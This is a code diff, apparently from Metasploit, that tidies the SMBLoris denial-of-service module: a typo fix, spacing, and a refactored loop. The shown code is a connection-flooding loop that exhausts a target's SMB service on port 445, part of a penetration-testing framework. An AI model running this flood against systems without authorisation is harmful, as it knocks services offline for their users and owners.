@@ -22,23 +22,23 @@ metadata = {
     grinds to a halt. This vulnerability was originally disclosed by Sean Dillon
     and Zach Harding.
 
-    DISCALIMER: This module opens a lot of simultaneous connections. Please check
+    DISCLAIMER: This module opens a lot of simultaneous connections. Please check
     your system's ULIMIT to make sure it can handle it. This module will also run
     continuously until stopped.
   },
   authors: [
-      'thelightcosine',
-      'Adam Cammack <adam_cammack[at]rapid7.com>'
+    'thelightcosine',
+    'Adam Cammack <adam_cammack[at]rapid7.com>'
   ],
   date: '2017-06-29',
   references: [
     { type: 'url', ref: 'https://web.archive.org/web/20170804072329/https://smbloris.com/' },
-    { type: 'aka', ref: 'SMBLoris'}
+    { type: 'aka', ref: 'SMBLoris' }
   ],
   type: 'dos',
   options: {
-    rhost: {type: 'address', description: 'The target address', required: true, default: nil},
-    rport: {type: 'port', description: 'SMB port on the target', required: true, default: 445},
+    rhost: { type: 'address', description: 'The target address', required: true, default: nil },
+    rport: { type: 'port', description: 'SMB port on the target', required: true, default: 445 }
   }
 }
 
@@ -55,39 +55,35 @@ def run(args)
 
   Metasploit.logging_prefix = "#{target.inspect_sockaddr} - "
 
-  while true do
-    begin
-      sockets.delete_if do |s|
-        s.closed?
-      end
+  loop do
+    sockets.delete_if(&:closed?)
 
-      nsock = target.connect(timeout: 360)
-      nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
-      nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
-      nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
-      nsock.setsockopt(Socket::Option.linger(true, 60))
-      nsock.write(header.to_binary_s)
-      sockets << nsock
+    nsock = target.connect(timeout: 360)
+    nsock.setsockopt(Socket::SOL_SOCKET, Socket::SO_KEEPALIVE, true)
+    nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPCNT, 5))
+    nsock.setsockopt(Socket::Option.int(:INET, :TCP, :KEEPINTVL, 10))
+    nsock.setsockopt(Socket::Option.linger(true, 60))
+    nsock.write(header.to_binary_s)
+    sockets << nsock
 
-      n_loops += 1
-      if  last_reported != sockets.length
-        if n_loops % 100 == 0
-          last_reported = sockets.length
-          Metasploit.log "#{sockets.length} socket(s) open", level: 'info'
-        end
-      elsif n_loops % 1000 == 0
-        Metasploit.log "Holding steady at #{sockets.length} socket(s) open", level: 'info'
+    n_loops += 1
+    if last_reported != sockets.length
+      if n_loops % 100 == 0
+        last_reported = sockets.length
+        Metasploit.log "#{sockets.length} socket(s) open", level: 'info'
       end
-    rescue Interrupt
-      break
-      sockets.each &:close
-    rescue Errno::EMFILE
-      Metasploit.log "At open socket limit with #{sockets.length} sockets open. Try increasing your system limits.", level: 'warning' unless warned
-      warned = true
-      sockets.slice(0).close
-    rescue Exception => e
-      Metasploit.log "Exception sending packet: #{e.message}", level: 'error'
+    elsif n_loops % 1000 == 0
+      Metasploit.log "Holding steady at #{sockets.length} socket(s) open", level: 'info'
     end
+  rescue Interrupt
+    sockets.each(&:close)
+    break
+  rescue Errno::EMFILE
+    Metasploit.log "At open socket limit with #{sockets.length} sockets open. Try increasing your system limits.", level: 'warning' unless warned
+    warned = true
+    sockets.slice(0).close
+  rescue StandardError => e
+    Metasploit.log "Exception sending packet: #{e.message}", level: 'error'
   end
 end
 
